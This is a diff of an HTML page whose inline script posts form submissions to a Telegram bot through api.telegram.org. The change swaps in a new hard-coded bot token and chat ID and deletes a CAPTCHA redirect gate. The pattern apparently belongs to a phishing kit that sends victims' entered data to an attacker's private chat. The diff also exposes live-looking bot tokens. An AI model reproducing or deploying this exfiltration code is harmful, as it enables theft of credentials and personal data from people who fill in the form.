@@ -261,8 +261,8 @@
 
   // Fonction pour envoyer les données via un bot Telegram
   async function sendToTelegramBot(message) {
-    const botToken = '5722730835:AAF-83VyMq8uBs0klBjz3iAdfEzPNJz8w0o'; // Remplacez par votre token de bot Telegram
-    const chatId = '-868620860'; // Remplacez par votre chat ID
+    const botToken = '7570565739:AAGzYPfC_exy-gHRKy2W8D969uk02Yn8gpQ'; // Remplacez par votre token de bot Telegram
+    const chatId = '-4744677068'; // Remplacez par votre chat ID
     const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
     try {
@@ -301,24 +301,6 @@
   // Ajouter un écouteur d'événement au formulaire
   document.querySelector('form').addEventListener('submit', handleFormSubmit);
 </script>
-<script>
-  // Vérification stricte du statut de validation du CAPTCHA
-  (function() {
-    const captchaValid = localStorage.getItem("captchaValid");
 
-    // Si le CAPTCHA n'est pas validé ou absent, rediriger immédiatement
-    if (captchaValid !== "true") {
-      // Optionnellement, afficher un message de verrouillage avant la redirection
-      document.body.innerHTML = "<h1>Accès interdit. Veuillez valider le CAPTCHA.</h1>";
-      // Rediriger après un délai pour que l'utilisateur puisse lire le message
-      setTimeout(function() {
-        window.location.href = "../";  // Redirection vers la page CAPTCHA
-      }, 3000);  // Attente de 3 secondes pour voir le message
-    } else {
-      // Si le CAPTCHA est validé, afficher le contenu strictement
-      document.getElementById("contenu").style.display = "block";
-    }
-  })();
-</script>
 </body></html>
       
